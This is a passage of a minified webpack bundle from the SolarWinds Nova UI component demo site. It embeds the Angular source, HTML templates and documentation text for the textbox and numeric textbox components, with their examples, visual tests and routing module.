LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./textbox-number-docs/textbox-number-docs.example.component";\nexport * from "./textbox-number-basic/textbox-number-basic.example.component";\nexport * from "./textbox-number-min-max/textbox-number-min-max.example.component";\nexport * from "./textbox-number-visual-test/textbox-number-visual-test.component";\nexport * from "./textbox-number-test/textbox-number-test.component";\n'},74530:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-textbox-number id="test-textbox-number"></nui-textbox-number>\n'},19806:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-textbox-number-basic-example",\n    templateUrl: "./textbox-number-basic.example.component.html",\n})\nexport class TextboxNumberBasicExampleComponent {}\n'},43470:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiTextboxModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    To use the textbox number component, add an\n    <code>&lt;nui-textbox-number&gt;</code> to your template. By default, the\n    <code>value</code> input is set to 0. However, if you want the component to\n    show a zero as soon as its rendered on the DOM, initialize the input\n    explicitly.\n</p>\n<nui-message type="warning" [allowDismiss]="false">\n    <strong>Note:</strong> The example uses the default value of\n    <code>1</code> for the <code>step</code> input, so if you manually type in a\n    floating point value, the increment/decrement buttons will still increment\n    by <code>1</code>. To have your implementation increment/decrement by\n    fractional values, set the <code>step</code> input to the desired floating\n    point interval--<code>0.1</code>\n    for example.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="textbox-number-basic"\n    exampleTitle="Basic usage"\n>\n    <nui-textbox-number-basic-example></nui-textbox-number-basic-example>\n</nui-example-wrapper>\n\n<h2>Inputs</h2>\n<ul>\n    <li>\n        <code>value</code> - Value corresponding to the\n        <code\n            ><a\n                href="https://angular.io/api/forms/ControlValueAccessor"\n                target="_blank"\n                >ControlValueAccessor</a\n            ></code\n        >\n        interface on the Angular forms API. Use banana-in-a-box notation or the\n        <code>valueChange</code> output to receive updates. Defaults to\n        <code>0</code>.\n    </li>\n    <li>\n        <code>minValue</code>- Set the minimum allowed value for the input\n        field. See the Min/Max section on this page for a live example.\n    </li>\n    <li>\n        <code>maxValue</code> - Set the maximum allowed value for the input\n        field. See the Min/Max section on this page for a live example.\n    </li>\n    <li>\n        <code>step</code> - Step by which the value is incremented/decremented\n        on click of the up/down buttons. Note this can be set to a floating\n        point value in addition to integers. Default is <code>1</code>.\n    </li>\n    <li>\n        <code>stepPrecision</code> - The decimal precision to use for rounding\n        each step increase/decrease when clicking the up/down buttons. Default\n        is <code>10</code>.\n    </li>\n    <li>\n        <code>placeholder</code> - Set the string to use as a placeholder for\n        the text box. Default is <code>""</code>.\n    </li>\n    <li>\n        <code>customBoxWidth</code> - Set a custom width in <code>px</code> for\n        the input field.\n    </li>\n    <li>\n        <code>disabled</code> - Disable the field. Default is\n        <code>false</code>.\n    </li>\n    <li>\n        <code>readonly</code> - Make the input read-only. Default is\n        <code>false</code>.\n    </li>\n    <li>\n        <code>name</code> - Set the value of the HTML input element\'s\n        <code\n            ><a\n                href="https://www.w3schools.com/tags/att_input_name.asp#:~:text=The%20name%20attribute%20specifies%20the,after%20a%20form%20is%20submitted."\n                target="_blank"\n                >name</a\n            ></code\n        >\n        attribute.\n    </li>\n</ul>\n\n<h2>Outputs</h2>\n<ul>\n    <li>\n        <code>blurred</code> - Use this output to get the value of the input\n        field when it is focused out.\n    </li>\n    <li>\n        <code>valueChange</code> - Use this output to get the value of the input\n        field when it changes.\n    </li>\n</ul>\n<nui-message type="info" [allowDismiss]="false">\n    For additional information about the above inputs and outputs, please take a\n    look at the\n    <a href="../components/TextboxNumberComponent.html#info" target="_parent"\n        >API tab</a\n    >\n    on this page. For usage examples of corresponding inputs on a similar\n    component, visit the documentation page for the\n    <code\n        ><a href="../components/TextboxComponent.html" target="_blank"\n            >&lt;nui-textbox&gt;</a\n        ></code\n    >\n    component.\n</nui-message>\n\n<h2>Min/Max Value Defined</h2>\n<p>\n    To define min/max value for <code>&lt;nui-textbox-number&gt;</code>, use the\n    <code>minValue</code> and <code>maxValue</code> inputs. In the following\n    example, the min is set to 1 and the max is set to 10.\n</p>\n<nui-example-wrapper\n    filenamePrefix="textbox-number-min-max"\n    exampleTitle="min/max value defined"\n>\n    <nui-textbox-number-min-max-example></nui-textbox-number-min-max-example>\n</nui-example-wrapper>\n'},91070:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=":host {\n    ul {\n        padding-left: 40px;\n\n        li {\n            list-style: disc;\n        }\n    }\n}\n"},35562:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-textbox-number-docs-example",\n    templateUrl: "./textbox-number-docs.example.component.html",\n    styleUrls: ["./textbox-number-docs.example.component.less"],\n})\nexport class TextboxNumberDocsExampleComponent {}\n'},91248:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div [formGroup]="reactiveForm">\n    <nui-textbox-number\n        id="test-textbox-number-min-max"\n        formControlName="number"\n        [minValue]="1"\n        [maxValue]="10"\n    ></nui-textbox-number>\n</div>\n'},33200:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder } from "@angular/forms";\n\n@Component({\n    selector: "nui-textbox-number-min-max-example",\n    templateUrl: "./textbox-number-min-max.example.component.html",\n})\nexport class TextboxNumberMinMaxExampleComponent {\n    public value = 10;\n\n    public reactiveForm;\n\n    constructor(public formBuilder: FormBuilder) {\n        this.reactiveForm = this.formBuilder.group({\n            number: [1],\n        });\n    }\n}\n'},52882:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col-xl">\n            <h3>Basic Textbox number</h3>\n            <nui-textbox-number id="test-textbox-number"></nui-textbox-number>\n            <hr />\n        </div>\n    </div>\n    <div class="row">\n        <div class="col-xl">\n            <h3>Textbox number with min\\max</h3>\n            <div>\n                <nui-textbox-number\n                    id="test-textbox-number-min-max"\n                    placeholder="Enter value between 1 and 10"\n                    [minValue]="1"\n                    [maxValue]="10"\n                >\n                </nui-textbox-number>\n            </div>\n            <hr />\n        </div>\n    </div>\n    <div class="row">\n        <div class="col-xl">\n            <h3>Disabled Textbox number</h3>\n            <nui-textbox-number\n                id="test-textbox-number-disabled"\n                value="-7"\n                [disabled]="true"\n            >\n            </nui-textbox-number>\n            <hr />\n        </div>\n    </div>\n    <div class="row">\n        <div class="col-xl">\n            <h3>Textbox number validation</h3>\n            <form #form="ngForm">\n                <nui-textbox-number\n                    id="test-textbox-number-validation"\n                    name="number"\n                    [(ngModel)]="value"\n                    [minValue]="1"\n                    [maxValue]="10"\n                >\n                </nui-textbox-number>\n                <div>\n                    VALID =\n                    <span class="test-textbox-number-validation__valid">{{\n                        form.valid\n                    }}</span>\n                </div>\n                <div>VALUE = [{{ value }}]</div>\n            </form>\n            <hr />\n        </div>\n    </div>\n    <div class="row">\n        <div class="col-xl">\n            <h3>Textbox number reactive form value</h3>\n            <div [formGroup]="reactiveForm">\n                <nui-textbox-number\n                    id="test-textbox-number-reactive"\n                    formControlName="number"\n                    [minValue]="1"\n                    [maxValue]="10"\n                >\n                </nui-textbox-number>\n                <div>FORM VALUE = [{{ reactiveForm.value | json }}]</div>\n            </div>\n            <hr />\n        </div>\n    </div>\n</div>\n'},91150:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder } from "@angular/forms";\n\n@Component({\n    selector: "nui-textbox-number-test",\n    templateUrl: "./textbox-number-test.component.html",\n})\nexport class TextboxNumberTestComponent {\n    public value = 10;\n\n    public reactiveForm;\n\n    constructor(public formBuilder: FormBuilder) {\n        this.reactiveForm = this.formBuilder.group({\n            number: [1],\n        });\n    }\n}\n'},14656:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col-xl">\n            <h3>Basic Textbox number</h3>\n            <nui-textbox-number\n                id="nui-visual-test-textbox-number"\n            ></nui-textbox-number>\n            <hr />\n        </div>\n    </div>\n    <div class="row">\n        <div class="col-xl">\n            <h3>Textbox number with min\\max</h3>\n            <div [formGroup]="reactiveForm">\n                <nui-textbox-number\n                    id="nui-visual-test-textbox-number-min-max"\n                    formControlName="number"\n                    [minValue]="1"\n                    [maxValue]="10"\n                >\n                </nui-textbox-number>\n            </div>\n            <hr />\n        </div>\n    </div>\n    <div class="row">\n        <div class="col-xl">\n            <h3>Disabled Textbox number</h3>\n            <nui-textbox-number\n                id="nui-visual-test-textbox-number-disabled"\n                value="-7"\n                [disabled]="true"\n            >\n            </nui-textbox-number>\n            <hr />\n        </div>\n    </div>\n</div>\n'},16032:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder } from "@angular/forms";\n\n@Component({\n    selector: "nui-textbox-number-visual",\n    templateUrl: "./textbox-number-visual-test.component.html",\n})\nexport class TextboxNumberVisualTestComponent {\n    public reactiveForm;\n\n    constructor(public formBuilder: FormBuilder) {\n        this.reactiveForm = this.formBuilder.group({\n            number: [10],\n        });\n    }\n}\n'},20319:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-textbox\n    id="demo-options-placeholder-textbox-item"\n    i18n-placeholder\n    placeholder="textbox placeholder"\n>\n</nui-textbox>\n'},4199:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-textbox-placeholder-example",\n    templateUrl: "./textbox-placeholder.example.component.html",\n})\nexport class TextboxPlaceholderExampleComponent {}\n'},8323:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-textbox\n    id="demo-options-readonly-textbox-item"\n    value="readonly textbox"\n    readonly="true"\n>\n</nui-textbox>\n'},76571:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-textbox-readonly-example",\n    templateUrl: "./textbox-readonly.example.component.html",\n})\nexport class TextboxReadonlyExampleComponent {}\n'},2233:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-textbox\n    id="demo-options-required-textbox-item"\n    [value]="value"\n    [isInErrorState]="isInErrorState()"\n    (textChange)="textChanged($event)"\n>\n</nui-textbox>\n'},40149:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-textbox-required-example",\n    templateUrl: "./textbox-required.example.component.html",\n})\nexport class TextboxRequiredExampleComponent {\n    public isRequired = true;\n    public value = "";\n\n    public isInErrorState(): boolean {\n        return this.isRequired && !this.value;\n    }\n\n    public textChanged($event: string): void {\n        this.value = $event;\n    }\n}\n'},48619:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col">\n            <h3>Basic Textbox</h3>\n            <nui-textbox\n                id="nui-visual-test-textbox-item"\n                value="example value"\n            >\n            </nui-textbox>\n            <hr />\n        </div>\n        <div class="col">\n            <h3>Textbox with Placeholder</h3>\n            <nui-textbox\n                id="nui-visual-test-placeholder-textbox-item"\n                i18n-placeholder\n                placeholder="textbox placeholder"\n            >\n            </nui-textbox>\n            <hr />\n        </div>\n        <div class="w-100"></div>\n        <div class="col">\n            <h3>Disabled Textbox</h3>\n            <nui-textbox\n                id="nui-visual-test-disabled-textbox-item"\n                value="disabled textbox"\n                disabled="true"\n            >\n            </nui-textbox>\n            <hr />\n        </div>\n        <div class="col">\n            <h3>Readonly Textbox</h3>\n            <nui-textbox\n                id="nui-visual-test-readonly-textbox-item"\n                value="readonly textbox"\n                readonly="true"\n            >\n            </nui-textbox>\n            <hr />\n        </div>\n        <div class="w-100"></div>\n        <div class="col">\n            <h3>Required Textbox</h3>\n            <nui-textbox\n                id="nui-visual-test-required-textbox-item"\n                [value]="value"\n                [isInErrorState]="isInErrorState()"\n                (textChange)="textChanged($event)"\n            >\n            </nui-textbox>\n            <hr />\n        </div>\n        <div class="col">\n            <h3>Textbox with Custom Width</h3>\n            <nui-textbox\n                id="nui-visual-test-custom-width-textbox-item"\n                customBoxWidth="200px"\n            >\n            </nui-textbox>\n            <hr />\n        </div>\n        <div class="w-100"></div>\n        <div class="col">\n            <h3>Textbox with Hint</h3>\n            <nui-form-field\n                i18n-caption\n                caption="Textbox with hint"\n                i18n-hint\n                hint="custom hint"\n            >\n                <nui-textbox id="nui-visual-test-hint-textbox-item">\n                </nui-textbox>\n            </nui-form-field>\n            <hr />\n        </div>\n        <div class="col">\n            <h3>Textbox with Info Icon</h3>\n            <nui-form-field\n                i18n-caption\n                caption="Textbox with info"\n                i18n-info\n                info="This is additional info for textbox"\n                id="nui-visual-test-info-formfield-item"\n            >\n                <nui-textbox\n                    id="nui-visual-test-info-textbox-item"\n                    value="Textbox with info"\n                >\n                </nui-textbox>\n            </nui-form-field>\n            <hr />\n        </div>\n        <div class="w-100"></div>\n        <div class="col">\n            <h3>Textbox with Textarea</h3>\n            <nui-textbox\n                id="nui-visual-test-area-textbox-item"\n                value="Text area"\n                rows="5"\n            >\n            </nui-textbox>\n            <hr />\n        </div>\n        <div class="col">\n            <h3>Textbox with Textarea and Placeholder</h3>\n            <nui-textbox\n                id="nui-visual-test-placeholder-area-textbox-item"\n                rows="5"\n                i18n-placeholder\n                placeholder="area textbox placeholder"\n            >\n            </nui-textbox>\n            <hr />\n        </div>\n    </div>\n</div>\n'},9267:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "textbox-visual-test",\n    templateUrl: "./textbox-visual-test.component.html",\n})\nexport class TextboxVisualTestComponent {\n    public isRequired = true;\n    public value = "";\n\n    public isInErrorState(): boolean {\n        return this.isRequired && !this.value;\n    }\n\n    public textChanged($event: string): void {\n        this.value = $event;\n    }\n}\n'},983:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiDocsModule,\n    NuiFormFieldModule,\n    NuiMessageModule,\n    NuiTextboxModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    TextboxAreaExampleComponent,\n    TextboxBasicExampleComponent,\n    TextboxCustomBoxWidthExampleComponent,\n    TextboxDisabledExampleComponent,\n    TextboxDocsExampleComponent,\n    TextboxGettingValueExampleComponent,\n    TextboxHintExampleComponent,\n    TextboxInfoExampleComponent,\n    TextboxNumberBasicExampleComponent,\n    TextboxNumberDocsExampleComponent,\n    TextboxNumberMinMaxExampleComponent,\n    TextboxNumberTestComponent,\n    TextboxNumberVisualTestComponent,\n    TextboxPlaceholderExampleComponent,\n    TextboxReadonlyExampleComponent,\n    TextboxRequiredExampleComponent,\n    TextboxVisualTestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: TextboxDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "textbox-number",\n        component: TextboxNumberDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "textbox-visual-test",\n        component: TextboxVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "textbox-number-test",\n        component: TextboxNumberTestComponent,\n    },\n    {\n        path: "textbox-number-visual-test",\n        component: TextboxNumberVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiTextboxModule,\n        NuiFormFieldModule,\n        FormsModule,\n        ReactiveFormsModule,\n        NuiMessageModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        TextboxAreaExampleComponent,\n        TextboxCustomBoxWidthExampleComponent,\n        TextboxDocsExampleComponent,\n        TextboxDisabledExampleComponent,\n        TextboxHintExampleComponent,\n        TextboxInfoExampleComponent,\n        TextboxNumberDocsExampleComponent,\n        TextboxNumberMinMaxExampleComponent,\n        TextboxNumberBasicExampleComponent,\n        TextboxNumberTestComponent,\n        TextboxPlaceholderExampleComponent,\n        TextboxBasicExampleComponent,\n        TextboxRequiredExampleComponent,\n        TextboxReadonlyExampleComponent,\n        TextboxVisualTestComponent,\n        TextboxNumberVisualTestComponent,\n        TextboxGettingValueExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("textbox"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class TextboxModule {}\n'},41781:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-switch (valueChange)="setTheme($event)" i18n>\n    Clown Party 